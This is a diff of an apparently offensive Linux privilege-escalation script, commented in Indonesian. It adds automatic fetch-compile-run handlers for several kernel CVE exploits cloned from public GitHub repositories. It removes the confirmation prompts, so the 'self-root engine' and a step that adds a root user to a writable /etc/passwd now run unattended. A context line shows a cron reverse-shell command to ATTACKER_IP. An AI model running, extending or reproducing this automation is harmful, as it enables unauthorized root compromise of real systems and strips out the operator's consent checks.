@@ -290,6 +290,7 @@ log "Kernel: $(uname -r)"
 log "OS: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2 || echo 'Unknown')"
 log ""
 
+if [ "$EXPLOIT_MODE" -eq 0 ]; then
 ################################################################################
 # 1. SYSTEM INFORMATION
 ################################################################################
@@ -327,6 +328,7 @@ if [ -d /etc/sudoers.d ]; then
     done
 fi
 
+fi # end SCAN_ONLY section 1
 ################################################################################
 # 2. SUID/SGID BINARIES
 ################################################################################
@@ -470,7 +472,14 @@ section "3. SUDO PERMISSIONS"
 
 if command -v sudo >/dev/null 2>&1; then
     info "Checking sudo permissions for current user..."
-    SUDO_OUTPUT=$(sudo -l 2>/dev/null)
+    # -n = non-interactive, tidak prompt password (avoid hang kalau pw tidak diketahui)
+    SUDO_OUTPUT=$(sudo -n -l 2>/dev/null)
+    if [ -z "$SUDO_OUTPUT" ] && [ -r /etc/sudoers ]; then
+        info "sudo butuh password — membaca /etc/sudoers langsung"
+        SUDO_OUTPUT=$(grep -v "^#" /etc/sudoers 2>/dev/null | grep -v "^$")
+    elif [ -z "$SUDO_OUTPUT" ] && [ "$EXPLOIT_MODE" -eq 1 ]; then
+        info "sudo butuh password dan /etc/sudoers tidak readable — bypass otomatis di section 33"
+    fi
     echo "$SUDO_OUTPUT" | tee -a "$OUTPUT_FILE"
     
     if echo "$SUDO_OUTPUT" | grep -q "NOPASSWD"; then
@@ -632,6 +641,7 @@ else
     warning "sudo command not found"
 fi
 
+if [ "$EXPLOIT_MODE" -eq 0 ]; then
 ################################################################################
 # 4. WORLD-WRITABLE FILES AND DIRECTORIES
 ################################################################################
@@ -737,6 +747,7 @@ find /etc/cron* -type f -writable 2>/dev/null | while read -r file; do
         "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' >> $file"
 done
 
+fi # end SCAN_ONLY sections 4-5
 ################################################################################
 # 6. CAPABILITIES
 ################################################################################
@@ -788,6 +799,7 @@ else
     warning "getcap command not found"
 fi
 
+if [ "$EXPLOIT_MODE" -eq 0 ]; then
 ################################################################################
 # 7. ENVIRONMENT VARIABLES
 ################################################################################
@@ -955,6 +967,7 @@ for hist in ~/.zsh_history ~/.sh_history ~/.python_history ~/.mysql_history; do
     fi
 done
 
+fi # end SCAN_ONLY sections 7-12
 ################################################################################
 # 13. WRITABLE SYSTEM FILES
 ################################################################################
@@ -1478,6 +1491,52 @@ if kver_ge 5 9 0 && kver_le 6 12 99; then
     fi
 fi
 
+# ── CVE-2021-3490 — eBPF ALU32 bounds bypass ─────────────────────────────────
+# Linux 5.7 – 5.11
+if kver_ge 5 7 0 && kver_le 5 11 99; then
+    critical "CVE-2021-3490 (eBPF ALU32) — Kernel $KERNEL_VERSION rentan!"
+    KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2021-3490")
+    show_exploit "CVE-2021-3490 (eBPF ALU32)" \
+        "eBPF ALU32 bounds tracking bypass. Verifier flaw LPE." \
+        "git clone https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490\ncd Linux_LPE_eBPF_CVE-2021-3490 && make && ./exploit"
+    kernel_auto_exploit "CVE-2021-3490" \
+        "https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490" \
+        "make 2>/dev/null || gcc -o exploit exploit.c -lpthread" \
+        "./exploit 2>/dev/null"
+fi
+
+# ── CVE-2022-34918 — nf_tables type confusion ────────────────────────────────
+# Linux 3.15 – 5.19 (butuh nf_tables)
+if kver_ge 3 15 0 && kver_le 5 19 99; then
+    if lsmod 2>/dev/null | grep -q nf_tables; then
+        critical "CVE-2022-34918 (nf_tables type confusion) — Kernel $KERNEL_VERSION rentan!"
+        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2022-34918")
+        show_exploit "CVE-2022-34918 (nf_tables)" \
+            "Type confusion di nf_tables chain policy validation. LPE via nft." \
+            "git clone https://github.com/randorisec/CVE-2022-34918-LPE-PoC\ncd CVE-2022-34918-LPE-PoC && make && ./exploit"
+        kernel_auto_exploit "CVE-2022-34918" \
+            "https://github.com/randorisec/CVE-2022-34918-LPE-PoC" \
+            "make 2>/dev/null || gcc -o exploit exploit.c" \
+            "./exploit 2>/dev/null"
+    fi
+fi
+
+# ── CVE-2023-35001 — nf_tables OOB read/write ────────────────────────────────
+# Linux 5.4 – 6.3.2 (butuh nf_tables)
+if kver_ge 5 4 0 && kver_le 6 3 2; then
+    if lsmod 2>/dev/null | grep -q nf_tables; then
+        critical "CVE-2023-35001 (nf_tables OOB) — Kernel $KERNEL_VERSION rentan!"
+        KERNEL_VULN_COUNT=$((KERNEL_VULN_COUNT+1)); VULN_CVES+=("CVE-2023-35001")
+        show_exploit "CVE-2023-35001 (nf_tables OOB)" \
+            "nf_tables out-of-bounds read/write via nft_byteorder expression." \
+            "git clone https://github.com/TurtleARM/CVE-2023-35001\ncd CVE-2023-35001 && make && ./exploit"
+        kernel_auto_exploit "CVE-2023-35001" \
+            "https://github.com/TurtleARM/CVE-2023-35001" \
+            "make 2>/dev/null || gcc -o exploit exploit.c -lpthread" \
+            "./exploit 2>/dev/null"
+    fi
+fi
+
 log ""
 if [ "${#VULN_CVES[@]}" -gt 0 ]; then
     echo -e "${BRIGHT_RED}[!!!] Total CVE kernel terdeteksi: ${#VULN_CVES[@]}${NC}"
@@ -1487,6 +1546,7 @@ else
     info "Referensi manual: https://github.com/SecWiki/linux-kernel-exploits"
 fi
 
+if [ "$EXPLOIT_MODE" -eq 0 ]; then
 ################################################################################
 # 16. NFS SHARES
 ################################################################################
@@ -1918,6 +1978,7 @@ for sys_dir in "${SYSTEM_DIRS[@]}"; do
     fi
 done
 
+fi # end SCAN_ONLY sections 16-28
 ################################################################################
 # 29. KERNEL SELF-ROOT ENGINE — AUTO EXPLOIT CHAIN
 ################################################################################
@@ -1941,10 +2002,10 @@ else
         echo -e "${YELLOW}CVE applicable :${NC} ${VULN_CVES[*]}"
         echo -e "${YELLOW}Total          :${NC} ${#VULN_CVES[@]} CVE"
         echo ""
-        echo -ne "${CYAN}Jalankan Self-Root Engine? (coba semua CVE berurutan) [y/N]: ${NC}"
-        read -r -t 30 _sre 2>/dev/null || _sre="n"
+        echo -e "${BRIGHT_RED}[AUTO] Self-Root Engine dijalankan otomatis (exploit mode aktif)${NC}"
+        _sre="y"
 
-        if [ "$_sre" = "y" ] || [ "$_sre" = "Y" ]; then
+        if [ "$_sre" = "y" ]; then
             _sre_dir=$(mktemp -d /tmp/selfroot_XXXXX)
             echo -e "${YELLOW}[*] Self-root workdir: $_sre_dir${NC}"
             log_exploit "[SELF-ROOT ENGINE STARTED] Kernel: $KERNEL_VERSION"
@@ -1996,6 +2057,18 @@ else
                     CVE-2017-16995)
                         command -v wget >/dev/null && wget -q "https://www.exploit-db.com/download/45010" -O exp.c 2>/dev/null
                         gcc -o ebpf exp.c 2>/dev/null && ./ebpf 2>/dev/null
+                        ;;
+                    CVE-2017-7308)
+                        command -v git >/dev/null && git clone --depth=1 https://github.com/xairy/kernel-exploits . 2>/dev/null
+                        { [ -d CVE-2017-7308 ] && cd CVE-2017-7308; } || true
+                        make 2>/dev/null || gcc -o pwn exploit.c 2>/dev/null
+                        ./pwn 2>/dev/null
+                        ;;
+                    CVE-2017-1000112)
+                        command -v git >/dev/null && git clone --depth=1 https://github.com/xairy/kernel-exploits . 2>/dev/null
+                        { [ -d CVE-2017-1000112 ] && cd CVE-2017-1000112; } || true
+                        make 2>/dev/null || gcc -o pwn exploit.c 2>/dev/null
+                        ./pwn 2>/dev/null
                         ;;
                     CVE-2019-13272)
                         command -v git >/dev/null && git clone --depth=1 https://github.com/bcoles/kernel-exploits . 2>/dev/null
@@ -2117,6 +2190,24 @@ chmod +s /tmp/rootbash" > /tmp/cg_cmd.sh
                         make 2>/dev/null || gcc -o exploit exploit.c -lpthread 2>/dev/null
                         ./exploit 2>/dev/null
                         ;;
+                    CVE-2021-3490)
+                        # eBPF ALU32 bounds bypass
+                        command -v git >/dev/null && git clone --depth=1 https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490 . 2>/dev/null
+                        make 2>/dev/null || gcc -o exploit exploit.c -lpthread 2>/dev/null
+                        ./exploit 2>/dev/null
+                        ;;
+                    CVE-2022-34918)
+                        # nf_tables type confusion
+                        command -v git >/dev/null && git clone --depth=1 https://github.com/randorisec/CVE-2022-34918-LPE-PoC . 2>/dev/null
+                        make 2>/dev/null || gcc -o exploit exploit.c 2>/dev/null
+                        ./exploit 2>/dev/null
+                        ;;
+                    CVE-2023-35001)
+                        # nf_tables OOB read/write
+                        command -v git >/dev/null && git clone --depth=1 https://github.com/TurtleARM/CVE-2023-35001 . 2>/dev/null
+                        make 2>/dev/null || gcc -o exploit exploit.c -lpthread 2>/dev/null
+                        ./exploit 2>/dev/null
+                        ;;
                     *)
                         echo -e "${GRAY}[-] Tidak ada handler untuk $_cve dalam chain.${NC}"
                         ;;
@@ -2149,6 +2240,7 @@ chmod +s /tmp/rootbash" > /tmp/cg_cmd.sh
     fi
 fi
 
+if [ "$EXPLOIT_MODE" -eq 0 ]; then
 ################################################################################
 # 30. PASSWORD AND CREDENTIAL SEARCH
 ################################################################################
@@ -2401,6 +2493,7 @@ else
     warning "Password patterns found in $PASSWORD_FILES_COUNT file(s)! Review the files above carefully."
 fi
 
+fi # end SCAN_ONLY section 30
 ################################################################################
 # 31. QUICK EXPLOIT SUMMARY (hanya di exploit mode)
 ################################################################################
@@ -2450,10 +2543,10 @@ if [ "$EXPLOIT_MODE" -eq 1 ]; then
         echo -e "${GRAY}Tidak ada quick win yang ditemukan. Review manual hasil scan di atas.${NC}"
     else
         echo ""
-        echo -ne "${CYAN}Jalankan exploit terbaik yang tersedia sekarang? [y/N]: ${NC}"
-        read -r -t 30 _qe_ans 2>/dev/null || _qe_ans="n"
+        echo -e "${BRIGHT_RED}[AUTO] Menjalankan exploit terbaik otomatis (exploit mode aktif)${NC}"
+        _qe_ans="y"
 
-        if [ "$_qe_ans" = "y" ] || [ "$_qe_ans" = "Y" ]; then
+        if [ "$_qe_ans" = "y" ]; then
             if [ -w /etc/passwd ]; then
                 echo -e "${BRIGHT_GREEN}[*] Menjalankan: tambah root user via /etc/passwd...${NC}"
                 exploit_add_root_user groovy groovy1669
